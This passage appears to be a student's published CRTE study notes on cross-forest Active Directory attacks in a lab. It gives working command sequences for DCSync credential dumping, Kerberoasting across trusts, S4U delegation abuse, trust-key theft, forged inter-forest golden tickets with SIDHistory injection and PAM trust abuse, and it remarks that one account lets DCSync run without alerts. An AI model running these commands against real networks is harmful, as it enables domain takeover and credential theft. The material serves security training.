+</span><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local"'</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>[NOTE] Because AD Connect synchronizes hashes every two minutes, in an Enterprise Environment, the <strong>MSOL_</strong> account will be <strong>excluded from tools like MDI</strong>!</p>
+</blockquote>
+
+<blockquote>
+  <p>This will allow us to run DCSync without any alerts!</p>
+</blockquote>
+
+<h1 id="forest-root">Forest Root</h1>
+
+<ul>
+  <li>Child to Forest Root - Trust Key</li>
+  <li>Child to Forest Root - krbtgt</li>
+</ul>
+
+<p>same material of CRTP:</p>
+
+<p><a href="https://MashrurRahmanRawnok.github.io/notes/crtp/domprivesc/#privesc---across-trusts">CRTP - Privesc Across Trusts</a></p>
+
+<h1 id="kerberoast-across-forest-trusts">Kerberoast across Forest Trusts</h1>
+
+<blockquote>
+  <p>It is possible to execute Kerberoast across Forest trusts.</p>
+</blockquote>
+
+<p><strong>Let’s enumerate named service accounts across forest trusts</strong></p>
+
+<p>Using PowerView:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainTrust</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">TrustAttributes</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'FILTER_SIDS'</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-SPN</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">TargetName</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Using ActiveDirectory Module:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s1">'IntraForest -ne $true'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">ServicePrincipalName</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s2">"</span><span class="bp">$null</span><span class="s2">"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="n">ServicePrincipalName</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Request a TGS:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/user:storagesvc</span><span class="w"> </span><span class="nx">/simple</span><span class="w"> </span><span class="nx">/domain:eu.local</span><span class="w"> </span><span class="nx">/outfile:euhashes.txt</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Check for the TGS:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">klist</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Crack using John:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">john.exe</span><span class="w"> </span><span class="nt">--wordlist</span><span class="o">=</span><span class="n">C:\AD\Tools\kerberoast\10k-worst-pass.txt</span><span class="w"> </span><span class="nx">C:\AD\Tools\hashes.txt</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Request TGS across trust using PowerShell:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-AssemblyName</span><span class="w"> </span><span class="nx">System.IdentityModel</span><span class="w">
+</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.IdentityModel.Tokens.KerberosRequestorSecurityToken</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="nx">MSSQLSvc/eu-file.eu.local</span><span class="err">@</span><span class="nx">eu.local</span><span class="w">
+</span></code></pre></div></div>
+
+<h1 id="delegations">Delegations</h1>
+
+<h2 id="constrained-delegation-with-protocol-transition">Constrained Delegation with Protocol Transition</h2>
+
+<blockquote>
+  <p>The classic Constrained Delegation does not work across forest trusts.
+But we can abuse it once we have a foothold across forest trust.</p>
+</blockquote>
+
+<p>Using PowerView:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainUser</span><span class="w"> </span><span class="err">–</span><span class="nx">TrustedToAuth</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">eu.local</span><span class="w">
+</span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="err">–</span><span class="nx">TrustedToAuth</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">eu.local</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Using ActiveDirectory module:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">msDS-AllowedToDelegateTo</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s2">"</span><span class="bp">$null</span><span class="s2">"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="n">msDS-AllowedToDelegateTo</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w">
+</span></code></pre></div></div>
+
+<p>We can request an alternate ticket using Rubeus:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="nx">/password:Qwerty</span><span class="err">@</span><span class="nx">2019</span><span class="w"> </span><span class="nx">/user:storagesvc</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w">
+</span><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:storagesvc</span><span class="w"> </span><span class="nx">/rc4:5C76877A9C454CDED58807C20C20AEAC</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w"> </span><span class="nx">/msdsspn:nmagent/dc.domain.local</span><span class="w"> </span><span class="nx">/altservice:ldap</span><span class="w"> </span><span class="nx">/dc:dc.domain.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Abuse the TGS to LDAP:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:domain\krbtgt /domain:domain.local"'</span><span class="w">
+</span></code></pre></div></div>
+<p>Or</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SharpKatz.exe</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="nx">dcsync</span><span class="w"> </span><span class="nt">--User</span><span class="w"> </span><span class="nx">domain\krbtgt</span><span class="w"> </span><span class="nt">--Domain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--DomainController</span><span class="w"> </span><span class="nx">dc.domain.local</span><span class="w">
+</span><span class="n">C:\AD\Tools\SharpKatz.exe</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="nx">dcsync</span><span class="w"> </span><span class="nt">--User</span><span class="w"> </span><span class="nx">domain\administrator</span><span class="w"> </span><span class="nt">--Domain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--DomainController</span><span class="w"> </span><span class="nx">dc.domain.local</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="unconstrained-delegation">Unconstrained Delegation</h2>
+
+<blockquote>
+  <p>Recall the Printer bug and its abuse from a machine with Unconstrained Delegation</p>
+</blockquote>
+
+<ul>
+  <li>We have used it to escalate privileges to Domain Admin and Enterprise Admin.</li>
+  <li>It also works across a Two-way forest trust with TGT Delegation enabled!</li>
+</ul>
+
+<blockquote>
+  <p>TGT Delegation is disabled by default and must be explicitly enabled across a trust for the trusted (target) forest.</p>
+</blockquote>
+
+<p>To enumerate if TGTDelegation is enabled across a forest trust, run the below command from a DC</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">netdom</span><span class="w"> </span><span class="nx">trust</span><span class="w"> </span><span class="nx">trustingforest</span><span class="w"> </span><span class="nx">/domain:trustedforest</span><span class="w"> </span><span class="nx">/EnableTgtDelegation</span><span class="w">
+</span></code></pre></div></div>
+
+<p>In the lab, this is to be run on usvendor-dc</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">netdom</span><span class="w"> </span><span class="nx">trust</span><span class="w"> </span><span class="nx">usvendor.local</span><span class="w"> </span><span class="nx">/domain:techcorp.local</span><span class="w"> </span><span class="nx">/EnableTgtDelegation</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The PowerShell cmdlets of the ADModule seems to have a bug, the below command shows TGTDelegation set to False:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-server</span><span class="w"> </span><span class="nx">usvendor.local</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>But when run from usvendor-dc, it shows TGTDelegation to be True</p>
+</blockquote>
+
+<h1 id="across-forest-using-trust-tickets">Across Forest using Trust Tickets</h1>
+
+<blockquote>
+  <p>By abusing the trust flow between forests in a two way trust, it is possible to access resources across the forest boundary.</p>
+</blockquote>
+
+<ul>
+  <li>We can use the Trust Key, the same way as in Domain trusts but we can access only those resources which are explicitly shared with our current forest.</li>
+  <li>Let’s try to access a file share ‘eushare’ on euvendor-dc of euvendor.local forest from eu.local which is explicitly shared with Domain Admins of eu.local.</li>
+</ul>
+
+<blockquote>
+  <p><em>There is content about this in CRTP</em></p>
+</blockquote>
+
+<p>Like intra forest scenario, we require the trust key for the inter-forest trust:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::trust /patch"'</span><span class="w">
+</span></code></pre></div></div>
+<p>or</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:eu\euvendor$"'</span><span class="w">
+</span></code></pre></div></div>
+<p>or</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::lsa /patch"'</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>We can also use any of the earlier discussed tools to extract trust keys.</p>
+</blockquote>
+
+<p>An inter-forest TGT can be forged:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt
+	/target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi"'</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Get a TGS for a service (CIFS below) in the target forest by using the forged trust ticket:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\asktgs.exe</span><span class="w"> </span><span class="nx">C:\AD\Tools\kekeo_old\sharedwitheu.kirbi</span><span class="w"> </span><span class="nx">CIFS/euvendor-dc.euvendor.local</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well</p>
+</blockquote>
+
+<p>Use the TGS to access the target resource which must be explicitly shared:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\kirbikator.exe</span><span class="w"> </span><span class="nx">lsa</span><span class="w"> </span><span class="nx">CIFS.euvendor-dc.euvendor.local.kirbi</span><span class="w">
+</span><span class="n">ls</span><span class="w"> </span><span class="nx">\\euvendor-dc.euvendor.local\eushare\</span><span class="w">
+</span></code></pre></div></div>
+
+<p>We can also use Rubeus:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/ticket:C:\Users\Public\sharedwitheu.kirbi</span><span class="w"> </span><span class="nx">/service:CIFS/euvendor-dc.euvendor.local</span><span class="w"> </span><span class="nx">/dc:euvendor-dc.euvendor.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>This is fine but why can’t we access all resources just like Intra forest?</li>
+  <li><strong>SID Filtering</strong> is the answer.</li>
+  <li>It filters high privilege SIDs from the <strong>SIDHistory</strong> of a TGT crossing forest boundary.</li>
+  <li>This means we cannot just go ahead and access resources in the trusting forest as an Enterprise Admin.</li>
+</ul>
+
+<blockquote>
+  <p>But there is a catch:</p>
+</blockquote>
+
+<p><img src="/assets/images/posts/crte/4.png" alt="Alt text" class="align-center" /></p>
+
+<p>Reference:</p>
+
+<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280">MS-PAC: Privilege Attribute Certificate Data Structure</a></p>
+
+<blockquote>
+  <p>This means, if we have an external trust (or a forest trust with SID history enabled -/enablesidhistory:yes), we can inject a <strong>SIDHistory for RID &gt; 1000</strong> to access resources accessible to that identity or group in the target trusting forest.</p>
+</blockquote>
+
+<p>We had DA access to eu.local. Let’s enumerate trusts from a PSRemoting session on eu-dc:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li><strong>SIDFilteringForestAware</strong> is set to <strong>True</strong>, it means SIDHistory is enabled across the forest trust.</li>
+</ul>
+
+<p>Please remember that still only RID &gt; 1000 SIDs will be allowed across the trust boundary:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">EUAdmins</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">euvendor.local</span><span class="w">
+</span></code></pre></div></div>
+
+<p>From eu-dc, create a TGT with SIDHistory of EUAdmins group:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt
+/target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\Users\Public\euvendornet.kirbi"'</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Request a TGS:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\asktgs.exe</span><span class="w"> </span><span class="nx">C:\Users\Public\euvendornet.kirbi</span><span class="w"> </span><span class="nx">HTTP/euvendor-net.euvendor.local</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Inject that into current session:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\kirbikator.exe</span><span class="w"> </span><span class="nx">lsa</span><span class="w"> </span><span class="nx">HTTP.euvendor-net.euvendor.local.kirbi</span><span class="w">
+</span></code></pre></div></div>
+<p>Or</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/ticket:C:\Users\Public\euvendornet.kirbi</span><span class="w"> </span><span class="nx">/service:HTTP/euvendor-net.euvendor.local</span><span class="w"> </span><span class="nx">/dc:euvendor-dc.euvendor.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Access the euvendor-net machine using PSRemoting:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="p">{</span><span class="n">whoami</span><span class="p">}</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="n">euvendor-net.euvendor.local</span><span class="w"> </span><span class="nt">-Authentication</span><span class="w"> </span><span class="nx">NegotiateWithImplicitCredential</span><span class="w">
+</span></code></pre></div></div>
+
+<h1 id="trust-abuse-mssql-servers">Trust Abuse (MSSQL Servers)</h1>
+
+<p>Same material as in the CRTP:</p>
+
+<p><a href="https://MashrurRahmanRawnok.github.io/notes/crtp/domprivesc/#trust-abuse---mssql-servers">CRTP - Trust Abuse (MSSQL Servers)</a></p>
+
+<h1 id="foreign-security-principals">Foreign Security Principals</h1>
+
+<blockquote>
+  <p>A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).</p>
+</blockquote>
+
+<ul>
+  <li>Only SID of a FSP is stored in the Foreign Security Principal Container which can be resolved using the trust relationship.</li>
+  <li>FSP allows external principals to be added to domain local security groups. Thus, allowing such principals to access resources in the forest.</li>
+  <li>Often, FSPs are ignored, mis-configured or too complex to change/cleanup in an enterprise making them ripe for abuse.</li>
+</ul>
+
+<p>PowerView:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-ForeignGroup</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span><span class="n">Find-ForeignUser</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Using ActiveDirectory module:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">objectClass</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"foreignSecurityPrincipal"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Access to resources in a forest trust can also be provided without using FSPs using ACLs.</li>
+  <li>Principals added to ACLs do NOT show up in the ForeignSecurityPrinicpals container as the container is populated only when a principal is added to a domain local security group</li>
+</ul>
+
+<p>Let’s enumerate ACLs for the dbvendor.local domain using the reverse shell we have on db.local:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">dbvendor.local</span><span class="w">
+</span></code></pre></div></div>
+
+<h1 id="abusing-pam-trust">Abusing PAM Trust</h1>
+
+<blockquote>
+  <p>PAM trust is usually enabled between a Bastion or Red forest and a production/user forest which it manages.</p>
+</blockquote>
+
+<ul>
+  <li>PAM trust provides the ability to access the production forest with high privileges without using credentials of the bastion forest. Thus, better security for the bastion forest which is much desired.</li>
+  <li>To achieve the above, Shadow Principals are created in the bastion domain which are then mapped to DA or EA groups SIDs in the production forest.</li>
+</ul>
+
+<blockquote>
+  <p>By enumerating trusts and hunting for access, we can enumerate that we have Administrative access in other forest.</p>
+</blockquote>
+
+<p>From techcorp-dc:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">objectClass</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"foreignSecurityPrincipal"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="n">bastion.local</span><span class="w">
+</span></code></pre></div></div>
+
+<p>On bastion-dc, enumerate if there is a PAM trust:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$bastiondc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nx">bastion-dc.bastion.local</span><span class="w">
+</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{(</span><span class="n">ForestTransitive</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$True</span><span class="p">)</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="p">(</span><span class="n">SIDFilteringQuarantined</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$False</span><span class="p">)}}</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$bastiondc</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Check which users are members of the Shadow Principals:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="p">(</span><span class="s2">"CN=Shadow Principal Configuration,CN=Services,"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">Get-ADRootDSE</span><span class="p">)</span><span class="o">.</span><span class="nf">configurationNamingContext</span><span class="p">)</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">member</span><span class="p">,</span><span class="nx">msDS-ShadowPrincipalSid</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="p">}</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$bastiondc</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Establish a direct PSRemoting session on bastion-dc and access production.local:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nx">192.168.102.1</span><span class="w"> </span><span class="nt">-Authentication</span><span class="w"> </span><span class="nx">NegotiateWithImplicitCredential</span><span class="w">
+</span></code></pre></div></div>
+
+<p>All attacks paths:</p>
+
+<p><img src="/assets/images/posts/crte/5.png" alt="Alt text" class="align-center" /></p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#ad" class="page__taxonomy-item" rel="tag">AD</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#intermediate" class="page__taxonomy-item" rel="tag">intermediate</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#crte" class="page__taxonomy-item" rel="tag">crte</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-12-30T00:00:00+06:00">December 30, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=4+-+Cross+Domain+Attacks%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrte%2Fcross%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrte%2Fcross%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrte%2Fcross%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/crte/adpersistence/" class="pagination--pager" title="3 - AD Persistence
+">Previous</a>
+    
+    
+      <a href="/notes/crte/cheatsheet/" class="pagination--pager" title="5 - Cheat Sheet
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
